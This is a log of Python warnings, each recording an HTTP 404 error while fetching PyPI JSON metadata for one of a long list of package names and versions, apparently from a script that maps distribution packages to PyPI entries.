WARNING:root:Error while fetching 'https://pypi.org/pypi/atspi/2.38.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/speech-dispatcher/0.11.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/bup/0.32/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/lzma/0.5.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/python-lhafile/0.2.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/python-rpm-packaging/0.0.20210526/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/al/0.1.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/apetag/1.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/essentia/2.1_beta5-859/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/fmoo-audiotools/3.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/mpd/0.3.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pyradio/0.9.2.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/zita-audiotools/1.3.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/zita-jacktools/1.6.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/sonata/1.7b1-22/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/locust/0.11.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/uiCA-g20230312+2022.12/py39-uiCA-g20230312+2022.12/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/biosig/2.5.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/libnuml/1.1.6/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/libsedml/2.0.32/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/orange3-single-cell/0.8.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/cadquery/2.0.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/cq-editor/0.1.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/lcapy/g20171202/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/ocp/7.4-RC2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pymtl/3.1.14/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/apitran/g20180926/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/elelabs-zigbee-ezsp-utility/20220218/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/libimobiledevice/1.3.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pyla/1.1.7.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/bencoder/0.2.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/check_mongodb/0.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/apache-arrow/8.0.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/apsw/3.38.5/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/gdbm/3.9.16/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/gdbm/3.10.10/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/gdbm/3.8.16/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/gdbm/3.7.16/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/gdbm/3.11.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/kyotocabinet/1.23/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pgmigrate/1.0.7/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/postgresql/1.3.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/sqlite3/3.8.16/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/sqlite3/2.7.18/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/sqlite3/3.7.16/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/sqlite3/3.9.16/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/sqlite3/3.10.10/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/sqlite3/3.11.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/sqlrelay/1.9.3/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/varstack/g.2015.10.22/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/xapian/1.4.22/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/gcalcli/4.0.4/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/autokey/0.95.10/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/paperless/2.7.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/boost-libs/1.81.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/brz/3.2.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/codesearch-py/g20190528/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/hgreviewboard/1.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/Jinja2-doc/3.1.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/absl/0.7.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/adb/1.3.0-9/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/bsd/1.0.20220425/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/bullet3/3.25/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/cadquery-pywrap/7.5/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/cheetah/3.2.6/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/cld/20150113/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/cliapp/1.20180812.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/cmdtest/0.33.s20191128/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/cog/3.1.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/country/22.3.5/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/ctags/1.0.5/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/cxx/7.1.7/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/daemon/2.3.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/dal/20081016/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/dateutil/2.8.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/dbus/1.3.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/demjson/3.0.6/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/dirspec/13.10/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/fabric3/1.14/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/fam/1.1.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/freebsd/0.9.5/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/freenas.utils/10.2a1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/game/2.2.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/game_sdl2/7.4.11/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/game_sdl2/7.4.11/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/gobject3/3.42.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/gyp/20200512/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/hidraw/0.2.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/Ice/3.6.5/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/Ice37/3.7.6/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/jaraco/1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/libpeas/1.34.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/libplist/2.2.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/libvirt/9.1.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/libzfs/1.1.2023020700/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/magic/5.44/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/omniorb/4.3.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/opendht/2.4.10/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/opengrok-tools/1.3.16/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/optik/1.5.3/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/plex/1.1.5/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pylru-cache/0.1.4/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pymtbl/0.5.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pynest2d/4.12.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pyro/4.77/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pytest-capturelog/0.7/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pytest4-cache/1.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pytest4-cov/2.9.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pytest4-flakes/4.0.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/python-distutils-extra/2.50/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/qt5/5.15.9/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/qt5-pyqt/5.15.9/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/qt5-qscintilla2/2.13.3/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/qt5-sip/12.11.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/qt6/6.4.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/qt6-pyqt/6.4.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/qt6-qscintilla2/2.13.3/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/qt6-sip/13.4.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/qtbuilder/1.14.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/rubymarshal/1.2.10/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/schematics-patched/1.1.2-patch/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/simpletal/4.3/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/sip4/4.19.25/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/stackexchange/2.2.7/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/statgrab/0.7.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/stdnum/1.18/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/subversion/1.14.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/subversion-lts/1.10.8/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/sysctl/0.3.3.20210928/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/threema-msgapi/3.0.6/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/tipper/0.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/ttystatus/0.36/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/urlimport/0.42b/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/urwidtrees/1.0.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/xarray-einstats/0.3.0-4/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/xarray-simlab/0.5.0-5/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/xcaplib/1.2.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/xdg/0.28/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/yaml/6.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/yapps2/2.1.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/zclockfile/2.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/zfp/1.0.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pybugz/0.13/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pycount/0.0.6/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pyside2-tools/5.15.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pythontidy/1.23/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/ros-catkin/0.8.10/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/ros-catkin_pkg/0.5.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/ros-rosdep/0.21.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/ros-rosdistro/0.9.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/ros-rosinstall_generator/0.1.22/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/ros-rospkg/1.4.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/ros-vcstool/0.3.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/ros-vcstools/0.1.42/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/ros-wstool/0.1.18/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/viewvc/1.3.0-20230104/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/YouCompleteMe/g20220614/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/adns/1.4/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/ldns/1.8.3/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pydnstable/0.7.3/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pywdns/0.10.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/setzer/54/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/electrum/4.3.4/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/odoo/16.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/odoo/14.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/odoo/15.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pandas-ta/0.3.14/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/grammalecte-fr/1.11.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/fife/0.4.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/mnemosyne/2.10.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/sgflib/1.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/sgfsummary/1.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/piddle/1.0.15/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/cairo/1.21.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/f3d/1.3.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/freeimagepy/2.0.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/mcomix/1.2.1g20210526/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/ming/0_4_8/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/openimageio/2.4.4.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/openshadinglanguage/1.12.6.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pivy/0.6.8/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/png/0.0.17/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pygraph/0.2.1-4/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pymaging/g20130908/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pymaging-png/g20130727/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/s2/0.10.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/ueberzug/18.1.8/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/qtqr/2.0.bzr39/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/limnoria/2021.11.18/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/weechat-otr/1.9.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/python-tools/3.9.16/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/alot/0.9/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/mailnag/2.2.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/milter/1.0.5/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/notmuch/0.37/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/notmuch0/0.37/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/offlineimap3/8.0.0-18/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/brial/1.2.11/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/cryptominisat/5.11.4/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/dionysus/g20210521/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/faiss/1.7.3/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/fenics-basix/0.5.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/gau2grid/2.0.7/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/kahip/3.14-19/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/libpoly/0.1.11/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/or-tools/9.5/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/piranha/0.11/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pyaudi/1.9.2-1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pybloom/3.0.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/spot/2.11.4/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/symengine/0.9.2-59/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/topologic/0.6.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/SoapySDR/0.8.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/ezc3d/1.5.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/fastscapelib/0.1.3-53/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/molequeue/0.9.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/openvdb/10.0.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/orange3-datafusion/0.1.11-7/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/orange3-network/1.5.1.20210224/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/papermill/2.4.0-15/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/powerline-status/2.8.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/tflearn/0.3.2-53/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/tvm/0.11.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/libopenshot/0.3.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/photofilmstrip/3.7.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/PySceneDetect/0.5.4/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/gstreamer/1.20.5/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/librtmp/0.3.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/metadata-cleaner/2.4.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/mlt6/6.26.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/quodlibet/4.3.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/cloud-init/23.1.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/cloud-init/22.4-28/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/dshell/3.2.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/libproxy-python/0.4.17/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/avahi/0.8/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/cloudflare-scrape/2.1.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/cloudflare-scrape-js2py/2.0.3/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/haproxyctl/0.5/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/httpstat/1.3.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/ldap/3.4.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/ldap0/1.4.7/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/libcloud/3.7.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/libdnet/1.13/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/msrplib/0.20.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/netif/1.0.20220211/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pyfixbuf/0.9.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pynmsg/0.5.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/qt5-networkauth/5.15.5/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/qt6-networkauth/6.4.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/radix/0.10.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/s4cmd/2.1.0-11/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/sbws/1.3.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/tofu/0.5/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/wsdd/0.7.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/toxcore-c/0.2.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/gstat_exporter/20191119/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pdagent/1.7.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pdagent-integrations/1.6.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/libtorrent-rasterbar/1.2.16/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/tremc/0.9.3/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pytoport/0.4.1-4/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/skog/0.1.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/pdf-redact-tools/0.1.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/frescobaldi/3.2/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/rtf/0.45/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/OpenFermion-Dirac/g20220812/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/py-OpenFermion-PySCF/0.5/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/OpenMC/0.13.1/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/PyNE/0.7.7/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/avogadrolibs/1.97.0/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/fresnel/0.13.4-4/json': HTTP Error 404: Not Found
WARNING:root:Error while fetching 'https://pypi.org/pypi/hoomd-blue/3.10.0/json': HTTP Error 404: Not Found
